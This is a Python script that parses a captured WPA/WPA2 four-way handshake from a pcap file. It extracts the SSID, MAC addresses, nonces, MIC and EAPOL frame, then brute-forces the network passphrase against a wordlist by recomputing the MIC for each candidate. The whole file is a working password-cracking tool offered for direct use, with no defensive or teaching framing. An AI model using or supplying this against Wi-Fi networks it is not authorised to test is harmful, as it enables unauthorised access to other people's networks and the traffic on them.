import sys
import binascii
import hashlib
import hmac
import argparse
from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon, Dot11ProbeResp

try:
    from termcolor import colored
except ImportError:
    def colored(s, *args, **kwargs): return s

def get_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            try:
                ssid = pkt.info.decode(errors='ignore')
                if ssid:
                    return ssid
            except Exception:
                continue
    return None

def zero_mic(eapol_raw):
    if len(eapol_raw) >= 97:
        return eapol_raw[:81] + b'\x00' * 16 + eapol_raw[97:]
    else:
        return eapol_raw

def extract_handshake_info(filename):
    packets = rdpcap(filename)
    ssid = get_ssid(packets)
    if not ssid:
        print(colored("[!] SSID not found! SSID is required.", "red"))
        sys.exit(2)

    ap_mac = None
    client_mac = None
    anonce = None
    snonce = None
    mic = None
    eapol2or4_raw = None
    key_descriptor_version = None

    for pkt in packets:
        if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
            dot11 = pkt.getlayer(Dot11)
            eapol = pkt.getlayer(EAPOL)
            eapol_raw = bytes(eapol)
            src = dot11.addr2
            dst = dot11.addr1
            bssid = dot11.addr3

            if len(eapol_raw) < 95:
                continue

            key_info = int.from_bytes(eapol_raw[5:7], 'big')
            mic_present = (key_info & (1 << 8)) != 0
            ack = (key_info & (1 << 7)) != 0
            install = (key_info & (1 << 6)) != 0
            # Descriptor version: lower 3 bits
            descriptor_version = key_info & 0b111

            nonce = eapol_raw[17:49].hex()
            mic_val = eapol_raw[81:97].hex()

            # Message 1 of 4-way handshake: ANonce (from AP to Client)
            if not mic_present and ack and not install and anonce is None:
                anonce = nonce
                ap_mac = src
                client_mac = dst

            # Message 2 or 4: SNonce + MIC (from Client to AP)
            elif mic_present and snonce is None:
                snonce = nonce
                mic = mic_val
                key_descriptor_version = descriptor_version
                # zero MIC field
                eapol_clean = zero_mic(eapol_raw)
                # Read EAPOL payload length (bytes 2 and 3)
                length = int.from_bytes(eapol_clean[2:4], 'big')
                total_len = 4 + length
                if total_len <= len(eapol_clean):
                    eapol_clean = eapol_clean[:total_len]
                eapol2or4_raw = eapol_clean

                if not ap_mac:
                    ap_mac = bssid if bssid != src else dst
                if not client_mac:
                    client_mac = src

    if not (anonce and snonce and mic and eapol2or4_raw and ssid and ap_mac and client_mac):
        print(colored("[!] Failed to extract all required handshake parameters.", "red"))
        sys.exit(3)

    print(colored("=========================================", "grey", "on_white"))
    print(colored("  [*] Handshake Extraction  ", "red", attrs=["reverse", "bold"]))
    print(colored("                       ", "grey", "on_white"))
    print(colored("=========================================", "grey", "on_white"))
    print(colored(f"SSID: {ssid}", "cyan"))
    print(colored(f"AP MAC (BSSID): {ap_mac}", "cyan"))
    print(colored(f"Client MAC (STA): {client_mac}", "cyan"))
    print(colored(f"ANonce: {anonce}", "cyan"))
    print(colored(f"SNonce: {snonce}", "cyan"))
    print(colored(f"MIC: {mic}", "cyan"))
    print(colored(f"EAPOL (msg 2 or 4, raw hex, MIC zeroed):", "cyan"))
    print(binascii.hexlify(eapol2or4_raw).decode())
    print(colored("\n[+] Extraction complete. Initiating brute-force protocol...", "magenta", attrs=["bold"]))
    return {
        "ssid": ssid,
        "ap_mac": ap_mac,
        "client_mac": client_mac,
        "anonce": anonce,
        "snonce": snonce,
        "mic": mic,
        "eapol_raw": eapol2or4_raw,
        "key_descriptor_version": key_descriptor_version
    }

def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) // 160):
        hmacsha1 = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:blen]

def crack_passphrase_wpa(params, passphrase, debug=True):
    # WPA (TKIP): MIC is HMAC-MD5, PMK is PBKDF2-HMAC-SHA1
    ssid = params["ssid"]
    ap_mac = binascii.unhexlify(params["ap_mac"].replace(":", ""))
    client_mac = binascii.unhexlify(params["client_mac"].replace(":", ""))
    anonce = binascii.unhexlify(params["anonce"])
    snonce = binascii.unhexlify(params["snonce"])
    mic = params["mic"]
    eapol = bytearray(params["eapol_raw"])

    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = customPRF512(pmk, b"Pairwise key expansion", B)
    mic_calc = hmac.new(ptk[:16], eapol, hashlib.md5).digest()[:16]
    mic_hex = mic_calc.hex()[:32]
    if debug:
        print(colored(f"[DEBUG][WPA] Trying passphrase: {passphrase}", "yellow"))
        print(colored(f"        Calculated MIC: {mic_hex}", "blue"))
        print(colored(f"        Expected MIC:   {mic.lower()}", "blue"))
    return mic_hex == mic.lower()

def crack_passphrase_wpa2(params, passphrase, debug=True):
    # WPA2 (CCMP/AES): MIC is HMAC-SHA1-128, PMK is PBKDF2-HMAC-SHA1
    ssid = params["ssid"]
    ap_mac = binascii.unhexlify(params["ap_mac"].replace(":", ""))
    client_mac = binascii.unhexlify(params["client_mac"].replace(":", ""))
    anonce = binascii.unhexlify(params["anonce"])
    snonce = binascii.unhexlify(params["snonce"])
    mic = params["mic"]
    eapol = bytearray(params["eapol_raw"])

    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = customPRF512(pmk, b"Pairwise key expansion", B)
    mic_calc = hmac.new(ptk[:16], eapol, hashlib.sha1).digest()[:16]
    mic_hex = mic_calc.hex()[:32]
    if debug:
        print(colored(f"[DEBUG][WPA2] Trying passphrase: {passphrase}", "yellow"))
        print(colored(f"        Calculated MIC: {mic_hex}", "blue"))
        print(colored(f"        Expected MIC:   {mic.lower()}", "blue"))
    return mic_hex == mic.lower()

def identify_encryption_type(params):
    # key_descriptor_version:
    # 1 = WPA (TKIP, HMAC-MD5), 2 or 3 = WPA2 (CCMP/AES, HMAC-SHA1-128)
    ver = params.get("key_descriptor_version", None)
    if ver == 1:
        return "WPA"
    elif ver in (2, 3):
        return "WPA2"
    else:
        # Fallback: try both
        return "UNKNOWN"

def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 handshake extract & passphrase check tool")
    parser.add_argument("handshake", help="Handshake .pcap file")
    parser.add_argument("-P", "--wordlist", help="Wordlist file to use", required=True)
    args = parser.parse_args()

    params = extract_handshake_info(args.handshake)
    enc_type = identify_encryption_type(params)
    print(colored(f"\nIdentified Encryption Type: {enc_type}", "magenta", attrs=["bold"]))

    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
        found = False
        attempt = 0
        for line in f:
            password = line.strip()
            attempt += 1
            print(colored(f"[*] [{attempt:04d}] Password Probe: {password}", "magenta"))
            if enc_type == "WPA":
                result = crack_passphrase_wpa(params, password)
            elif enc_type == "WPA2":
                result = crack_passphrase_wpa2(params, password)
            else:
                # Try both if unknown
                result = crack_passphrase_wpa2(params, password) or crack_passphrase_wpa(params, password)
            if result:
                print(colored(f"\n[!!!] PASSWORD CRACKED: >>> {password} <<<", "green", attrs=["reverse", "bold"]))
                found = True
                break
        if not found:
            print(colored("\n[-] Password not found in wordlist. Operation failed.", "red", attrs=["reverse", "bold"]))

if __name__ == "__main__":
    main()
